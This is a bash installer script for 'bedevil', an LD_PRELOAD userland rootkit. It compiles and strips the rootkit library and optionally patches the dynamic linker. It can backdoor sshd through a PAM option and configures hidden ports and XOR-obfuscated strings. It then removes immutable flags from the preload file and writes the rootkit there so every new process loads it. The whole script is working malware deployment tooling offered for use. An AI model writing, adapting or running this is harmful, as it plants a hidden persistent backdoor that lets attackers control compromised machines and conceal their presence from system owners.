#!/bin/bash

tty -s && clear && [ -f .ascii ] && \
    printf "\e[1m\e[31m`cat .ascii`\e[0m\n"

# contains functions for getting random stuff. see for more info.
source ./etc/random.sh

# contains a bunch of miscellaneous functions. see for more info.
source ./etc/util.sh

# default values for necessary variables.
source ./etc/defaults.sh

# contains, mainly, functions for use with dialog.
# 'show_yesno' checks for dialog support/use and shows
# input prompt depending on whether or not we can/want to use
# dialog.
source ./etc/dialog.sh

# handles (automatic?) reading & writing of/to 'toggles.h'
source ./etc/toggles.sh

# functions for fetching essential rootkit header
# directories & paths included by includes.h
source ./etc/headers.sh

# functions responsible for locating & writing
# xor'd arrays within rootkit include directories.
source ./etc/arrays.sh

# functions responsible for locating & writing
# xor'd consts within rootkit include directories.
source ./etc/consts.sh

# the functions within this script handle setting up
# ports & ranges to be hidden before writing them
# to a destination.
source ./etc/hideports.sh

# the functions in this script are what makes the
# magic happen when it comes to finding & writing
# rootkit settings. the current system we have for
# this is no way near efficient enough.
# (IT'S SLOW AS HELL!!!!)
source ./etc/settings.sh

# what it sounds like. read for more info.
source ./etc/postinstall.sh

compile_bdvl(){
    [ ! -d "$NEW_MDIR" ] && { \
        eecho "'$NEW_MDIR' does not exist. Have you populated your new headers?"; \
        exit; \
    }

    local warning_flags optimization_flags    \
          options linker_options linker_flags

    warning_flags=(-Wall)
    optimization_flags=(-O0 -g0)
    options=(-fomit-frame-pointer -fPIC)
    linker_options=(-Wl,--build-id=none)
    linker_flags=(-ldl)
    [ `toggle_enabled USE_CRYPT` == "true" ] && linker_flags+=(-lcrypt)
    [ `toggle_enabled ACCEPT_USE_SSL` == "true" ] && linker_flags+=(-lssl)
    [ $PLATFORM == "armv7l" ] && PLATFORM="v7l"
    [ $PLATFORM == "armv6l" ] && PLATFORM="v6l"

    local compile_reg="gcc -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]} \
                      -I$NEW_MDIR -shared ${linker_flags[*]} ${linker_options[*]} -o $BDVLSO.$PLATFORM"
    local compile_m32="gcc -m32 -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]} \
                      -I$NEW_MDIR -shared ${linker_flags[*]} ${linker_options[*]} -o $BDVLSO.i686"

    # only show gcc output if we want to output verbosely.
    [ $VERBOSE == 1 ] && `$compile_reg` || `$compile_reg &>/dev/null`
    [ $VERBOSE == 1 ] && `$compile_m32` || `$compile_m32 &>/dev/null`

    strip $BDVLSO.$PLATFORM 2>/dev/null || { eecho "Couldn't strip $BDVLSO.$PLATFORM, exiting"; exit; }
    strip $BDVLSO.i686 2>/dev/null || wecho "Couldn't strip $BDVLSO.i686, this is ok"

    [ -f $BDVLSO.$PLATFORM ] && \
        secho "`lib_size $PLATFORM`"
    [ -f $BDVLSO.i686 ] && \
        secho "`lib_size i686`"
}

install_bdvl(){
    [ `id -u` != 0 ] && { \
        eecho "Not root. Cannot continue..." && \
        exit; \
    }

    secho "Starting full installation!\n"
    wecho "Make sure any essential dependencies are installed."
    wecho "You can do this with '$0 -D'"

    local response="$(show_yesno "Patch dynamic linker libs?")"; echo
    if [ $response == 0 ]; then
        necho "Patching dynamic linker libraries, please wait..."
        LDSO_PRELOAD="`etc/patch_libdl.sh -op | tail -n 1`"   # change default LDSO_PRELOAD to new
                                                              # preload file location.
        secho "Finished patching dynamic linker"
    fi; echo

    # get installation specific settings & compile rootkit
    populate_new_placeholders
    compile_bdvl

    # after successful compilation, copy rootkit shared object(s) to install dir
    echo && necho "Installing to \$INSTALL_DIR ($INSTALL_DIR)"
    [ ! -d $INSTALL_DIR ] && mkdir -p $INSTALL_DIR/
    [ -f $BDVLSO.$PLATFORM ] && cp $BDVLSO.$PLATFORM $INSTALL_DIR/$BDVLSO.$PLATFORM
    [ -f $BDVLSO.i686 ] && cp $BDVLSO.i686 $INSTALL_DIR/$BDVLSO.i686

    [ "`toggle_enabled USE_PAM_BD`" == "true" ] && \
        patch_sshdconfig

    # setup the rootkit's installation directory before setting up the rootkit's preload file.
    setup_home $INSTALL_DIR

    # after installing the rootkit to its directory and enabling anything that may need it, we
    # can go ahead with having every new process henceforth preload the rootkit.
    necho "Writing \$SOPATH to \$LDSO_PRELOAD"
    [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
    echo -n "$SOPATH" > $LDSO_PRELOAD
    secho "Installation complete!"
    cleanup_bdvl
}

VERBOSE=0
USE_DIALOG=0
DOCOMPRESS=0
USAGE="
  Usage: $0 [option(s)]
      Options:
          -h: Show this help message & exit.
          -v: Output verbosely.
          -e: Do an environment check. (RECOMMENDED)
          -u: Enable use of 'dialog' throughout setup.
          -t: Go through & switch rootkit toggles.
          -C: Clean up installation/compilation mess.
          -d: Configure rootkit headers & settings.
          -z: After configuration has finished, compress the resulting
              new include directory with gzip for faster future deployments.
          -c: Compile rootkit in current directory & exit.
          -D: Install all potential required dependencies. (REQUIRES ROOT)
          -i: Launch full installation of bedevil. (REQUIRES ROOT)
"

while getopts "hvuetCzdcDi?" opt; do
    case "$opt" in
    h)
        echo "$USAGE"
        exit
        ;;
    v)
        secho "Outputting verbosely"
        VERBOSE=1
        ;;
    u)
        [ ! -f `bin_path dialog` ] && \
            eecho "Could not find dialog..." || USE_DIALOG=1
        ;;
    e)
        etc/environ.sh
        ;;
    t)
        [ $USE_DIALOG == 1 ] && \
            dialog_set_toggles || set_toggles
        ;;
    z)
        necho "Going to compress $NEW_MDIR once it is created"
        DOCOMPRESS=1
        ;;
    d)  
        populate_new_placeholders
        ;;
    c)
        compile_bdvl
        ;;
    C)
        cleanup_bdvl
        ;;
    i)
        install_bdvl
        exit
        ;;
    D)
        etc/install_deps.sh
        ;;
    ?)
        echo "$USAGE"
        exit
        ;;
    esac
done

[ $OPTIND == 1 ] || [[ $1 != "-"* ]] && echo "$USAGE"
